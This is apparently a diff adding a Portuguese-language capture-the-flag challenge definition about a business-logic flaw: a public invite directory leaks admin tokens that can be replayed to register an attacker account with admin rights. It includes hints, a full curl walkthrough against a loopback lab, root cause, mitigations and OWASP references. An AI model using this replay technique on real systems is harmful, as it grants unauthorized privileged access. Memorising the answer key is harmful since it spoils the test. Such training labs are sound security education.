@@ -1,0 +1,81 @@
+{
+  "slug": "logic-invite-reuse",
+  "title": "O convite de administrador",
+  "codename": "ATRIUM INVITES",
+  "summary": "O diretório de convites da Atrium é público e retorna tokens em texto claro. Os convites nunca são consumidos após o uso e não estão vinculados ao email convidado, então o mesmo convite de administrador pode ser resgatado por um atacante para criar a própria vaga de administrador e ler o segredo do control plane.",
+  "category": "logic",
+  "difficulty": "easy",
+  "kind": "challenge",
+  "lab_dir": "logic-invite-reuse",
+  "estimated_minutes": 15,
+  "xp": 120,
+  "tech": [
+    "Flask",
+    "Sessions",
+    "REST API"
+  ],
+  "tags": [
+    "business-logic",
+    "invitation",
+    "replay",
+    "privilege-escalation"
+  ],
+  "story": "A Atrium é por convite. Cada token deveria ser destinado a uma pessoa, carregar um papel e funcionar exatamente uma vez. O serviço de convites expõe /invite/list para que o front-end renderize um diretório, e o diretório retorna os tokens em texto claro. O cadastro copia o papel diretamente do convite e nunca verifica o email enviado, então um convite de administrador vazado pode ser reproduzido por qualquer um que o encontre já resgatado.",
+  "objective": "Recupere um token de convite privilegiado, resgate-o com a sua própria conta e leia o segredo de administração.",
+  "rules": "Use apenas a origem loopback atribuída. Não faça varredura em outras portas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo do control plane",
+      "flag_type": "root",
+      "points": 120,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Existe um diretório",
+      "body": "A barra de navegação tem um link para uma lista de convites. Requisite `/invite/list` e veja o que o JSON realmente contém: papel, email, `claimed_by` e o próprio token.",
+      "cost": 10
+    },
+    {
+      "level": 2,
+      "title": "Os papéis vêm do convite",
+      "body": "`POST /register` recebe `token`, `username`, `email` e `password`. O papel da nova vaga é copiado do registro do convite, e nada compara o email enviado com o endereço convidado.",
+      "cost": 15
+    },
+    {
+      "level": 3,
+      "title": "Resgate um convite já usado",
+      "body": "Cadastre-se com o token `admin` de `/invite/list` mesmo que `claimed_by` já esteja definido, depois abra `/welcome`. O painel de administração mostra a flag.",
+      "cost": 20
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Enumere.** O serviço de convites é público:\n```bash\nBASE=http://127.0.0.1:PORT\ncurl -s \"$BASE/invite/list\"\n```\n```json\n{\"invitations\": [\n  {\"token\": \"ATR-ADMIN-7X9Q\", \"role\": \"admin\", \"email\": \"security@atrium.example\", \"claimed_by\": \"first\", \"active\": true},\n  {\"token\": \"ATR-STAFF-2M4K\", \"role\": \"staff\", \"email\": \"ops@atrium.example\", \"claimed_by\": null, \"active\": true}\n]}\n```\nO token de administrador continua `active` mesmo já tendo sido resgatado.\n\n**Resgate-o como você mesmo.**\n```bash\ncurl -s -c jar -b jar -X POST \\\n  -d 'token=ATR-ADMIN-7X9Q&username=mallory&email=attacker@mail.example&password=hunter22' \\\n  \"$BASE/register\"\n```\nA vaga é criada com `role=admin` (obtido do convite) e o atacante fica autenticado.\n\n**Colete.**\n```bash\ncurl -s -c jar -b jar \"$BASE/welcome\"\n```\nO painel de administração renderiza o segredo do control plane, e o lab chama `lab.objective_async(\"flag\", ...)`.",
+    "root_cause": "Um token de uso único sem semântica de uso único. O convite não é marcado como consumido (`active` permanece `true`), não está vinculado ao endereço de email convidado e seu papel é confiado implicitamente. O armazenamento de tokens também é exposto somente leitura por meio de um diretório JSON público. Juntos, esses fatores transformam um convite em uma concessão de privilégio reutilizável.",
+    "mitigation": "Consuma os convites de forma atômica no primeiro uso (atualização condicional em `active`/`claimed_at`, rejeite replays), vincule o token ao email convidado e verifique esse endereço, nunca exponha tokens em listagens, defina expiração, armazene apenas um hash no servidor e mantenha a atribuição de papel no servidor vinculada a um registro aprovado por administrador."
+  },
+  "references": [
+    {
+      "title": "OWASP — Business Logic Security Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Business_Logic_Security_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Rejeite replays de etapas de uso único e rederive identidade e papel no servidor."
+    },
+    {
+      "title": "OWASP — Cryptographic Storage Cheat Sheet (token storage)",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Armazene tokens de uso único como hashes para que listagens ou vazamentos não permitam reutilizá-los."
+    },
+    {
+      "title": "CWE-285 — Improper Authorization",
+      "url": "https://cwe.mitre.org/data/definitions/285.html",
+      "source_type": "standard",
+      "description": "Autorização realizada sem aplicar quem pode reivindicar a identidade privilegiada."
+    }
+  ]
+}
